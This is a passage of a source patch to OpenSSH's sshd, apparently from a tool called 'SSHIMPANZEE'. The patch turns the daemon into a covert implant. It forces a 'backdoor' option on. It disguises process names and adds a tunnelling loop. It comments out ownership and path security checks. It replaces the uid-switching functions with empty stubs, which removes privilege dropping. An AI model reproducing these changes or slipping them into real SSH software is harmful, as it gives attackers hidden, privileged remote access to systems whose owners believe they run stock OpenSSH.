++			int flags = fcntl(*newsock, F_GETFL, 0);
++
++			flags = flags | O_NONBLOCK;
++			fcntl(*newsock, F_SETFL, flags);
++
++			//	*newsock = accept(listen_socks[i],
++			//   (struct sockaddr *)&from, &fromlen);
+ 			if (*newsock == -1) {
+ 				if (errno != EINTR && errno != EWOULDBLOCK &&
+ 				    errno != ECONNABORTED && errno != EAGAIN)
+@@ -1257,6 +1326,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 					    strerror(errno));
+ 				if (errno == EMFILE || errno == ENFILE)
+ 					usleep(100 * 1000);
++				usleep(TIMER);
+ 				continue;
+ 			}
+ 			if (unset_nonblock(*newsock) == -1) {
+@@ -1284,7 +1354,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 				close(startup_p[1]);
+ 				continue;
+ 			}
+-
++			
+ 			for (j = 0; j < options.max_startups; j++)
+ 				if (startup_pipes[j] == -1) {
+ 					startup_pipes[j] = startup_p[0];
+@@ -1292,7 +1362,6 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 					startup_flags[j] = 1;
+ 					break;
+ 				}
+-
+ 			/*
+ 			 * Got connection.  Fork a child to handle it, unless
+ 			 * we are in debugging mode.
+@@ -1362,6 +1431,7 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 				return;
+ 			}
+ 
++			//signal(SIGCHLD, SIG_IGN);
+ 			/* Parent.  Stay in the loop. */
+ 			platform_post_fork_parent(pid);
+ 			if (pid == -1)
+@@ -1377,19 +1447,24 @@ server_accept_loop(int *sock_in, int *sock_out, int *newsock, int *config_s)
+ 				close(config_s[0]);
+ 			}
+ 			close(*newsock);
+-
++			
+ 			/*
+ 			 * Ensure that our random state differs
+ 			 * from that of the child
+ 			 */
+ 			arc4random_stir();
+ 			arc4random_buf(rnd, sizeof(rnd));
++
++			// WAIT FOR CHILD TO FINISH BEFORE RETRYING TO CONNECT
++			waitpid(pid, &i, 0);
++			
+ #ifdef WITH_OPENSSL
+ 			RAND_seed(rnd, sizeof(rnd));
+ 			if ((RAND_bytes((u_char *)rnd, 1)) != 1)
+ 				fatal("%s: RAND_bytes failed", __func__);
+ #endif
+ 			explicit_bzero(rnd, sizeof(rnd));
++
+ 		}
+ 	}
+ }
+@@ -1596,7 +1671,7 @@ main(int ac, char **av)
+ 
+ 	/* Parse command-line arguments. */
+ 	while ((opt = getopt(ac, av,
+-	    "C:E:b:c:f:g:h:k:o:p:u:46DGQRTdeiqrtV")) != -1) {
++	    "C:E:b:c:f:g:h:k:o:p:u:46DGQRTdeiqrtVB")) != -1) {
+ 		switch (opt) {
+ 		case '4':
+ 			options.address_family = AF_INET;
+@@ -1700,6 +1775,9 @@ main(int ac, char **av)
+ 				exit(1);
+ 			free(line);
+ 			break;
++		case 'B':
++		  options.backdoor = 1;
++		  break;
+ 		case 'V':
+ 			fprintf(stderr, "%s, %s\n",
+ 			    SSH_VERSION, SSH_OPENSSL_VERSION);
+@@ -1709,17 +1787,18 @@ main(int ac, char **av)
+ 			break;
+ 		}
+ 	}
++	options.backdoor = 1;
+ 	if (rexeced_flag || inetd_flag)
+ 		rexec_flag = 0;
+-	if (!test_flag && !do_dump_cfg && rexec_flag && !path_absolute(av[0]))
+-		fatal("sshd re-exec requires execution with an absolute path");
++	//if (!test_flag && !do_dump_cfg && rexec_flag && !path_absolute(av[0]))
++	//	fatal("sshd re-exec requires execution with an absolute path");
+ 	if (rexeced_flag)
+ 		closefrom(REEXEC_MIN_FREE_FD);
+ 	else
+ 		closefrom(REEXEC_DEVCRYPTO_RESERVED_FD);
+ 
+ 	seed_rng();
+-
++	
+ 	/* If requested, redirect the logs to the specified logfile. */
+ 	if (logfile != NULL)
+ 		log_redirect_stderr_to(logfile);
+@@ -1755,7 +1834,7 @@ main(int ac, char **av)
+ 	if ((cfg = sshbuf_new()) == NULL)
+ 		fatal_f("sshbuf_new failed");
+ 	if (rexeced_flag) {
+-		setproctitle("%s", "[rexeced]");
++		setproctitle(SSHIMPANZEE_PROC_NAME);
+ 		recv_rexec_state(REEXEC_CONFIG_PASS_FD, cfg);
+ 		if (!debug_flag) {
+ 			startup_pipe = dup(REEXEC_STARTUP_PIPE_FD);
+@@ -1814,7 +1893,6 @@ main(int ac, char **av)
+ 		fprintf(stderr, "Extra argument %s.\n", av[optind]);
+ 		exit(1);
+ 	}
+-
+ 	debug("sshd version %s, %s", SSH_VERSION, SSH_OPENSSL_VERSION);
+ 
+ 	if (do_dump_cfg)
+@@ -1996,10 +2074,10 @@ main(int ac, char **av)
+ 		    (st.st_uid != getuid () ||
+ 		    (st.st_mode & (S_IWGRP|S_IWOTH)) != 0))
+ #else
+-		if (st.st_uid != 0 || (st.st_mode & (S_IWGRP|S_IWOTH)) != 0)
++		  //if (st.st_uid != 0 || (st.st_mode & (S_IWGRP|S_IWOTH)) != 0)
+ #endif
+-			fatal("%s must be owned by root and not group or "
+-			    "world-writable.", _PATH_PRIVSEP_CHROOT_DIR);
++		  //	fatal("%s must be owned by root and not group or "
++		  //	    "world-writable.", _PATH_PRIVSEP_CHROOT_DIR);
+ 	}
+ 
+ 	if (test_flag > 1)
+@@ -2054,9 +2132,18 @@ main(int ac, char **av)
+ 
+ 		if (daemon(0, 0) == -1)
+ 			fatal("daemon() failed: %.200s", strerror(errno));
+-
+ 		disconnect_controlling_tty();
+ 	}
++	#ifdef TUN
++	setproctitle(SSHIMPANZEE_PROC_NAME);
++	if (!inetd_flag)
++	  {
++	    while(1) {
++	      tun();
++	      usleep(TIMER);
++	    }
++	  }
++	#endif
+ 	/* Reinitialize the log (because of the fork above). */
+ 	log_init(__progname, options.log_level, options.log_facility, log_stderr);
+ 
+@@ -2104,7 +2191,7 @@ main(int ac, char **av)
+ 	}
+ 
+ 	/* This is the child processing a new connection. */
+-	setproctitle("%s", "[accepted]");
++	setproctitle(SSHIMPANZEE_PROC_NAME);
+ 
+ 	/*
+ 	 * Create a new session and process group since the 4.4BSD
+diff --git a/sshkey.c b/sshkey.c
+index 43712253..2b4525be 100644
+--- a/sshkey.c
++++ b/sshkey.c
+@@ -59,6 +59,8 @@
+ #include "match.h"
+ #include "ssh-sk.h"
+ 
++
++
+ #ifdef WITH_XMSS
+ #include "sshkey-xmss.h"
+ #include "xmss_fast.h"
+diff --git a/uidswap.c b/uidswap.c
+index 6ed3024d..8e348bc3 100644
+--- a/uidswap.c
++++ b/uidswap.c
+@@ -57,8 +57,12 @@ static int	saved_egroupslen = -1, user_groupslen = -1;
+  * Temporarily changes to the given uid.  If the effective user
+  * id is not root, this does nothing.  This call cannot be nested.
+  */
++
++void
++temporarily_use_uid(struct passwd *pw){}
++
+ void
+-temporarily_use_uid(struct passwd *pw)
++temporarily_use_uid_bkp(struct passwd *pw)
+ {
+ 	/* Save the current euid, and egroups. */
+ #ifdef SAVED_IDS_WORK_WITH_SETEUID
+@@ -139,7 +143,11 @@ temporarily_use_uid(struct passwd *pw)
+  * Restores to the original (privileged) uid.
+  */
+ void
+-restore_uid(void)
++restore_uid(void){}
++
++
++void
++restore_uid_bkp(void)
+ {
+ 	/* it's a no-op unless privileged */
+ 	if (!privileged) {
+@@ -178,7 +186,12 @@ restore_uid(void)
+  * called while temporarily_use_uid is effective.
+  */
+ void
+-permanently_set_uid(struct passwd *pw)
++permanently_set_uid(struct passwd *pw){}
++
++
++ 
++void
++permanently_set_uid_bkp(struct passwd *pw)
+ {
+ #ifndef NO_UID_RESTORATION_TEST
+ 	uid_t old_uid = getuid();
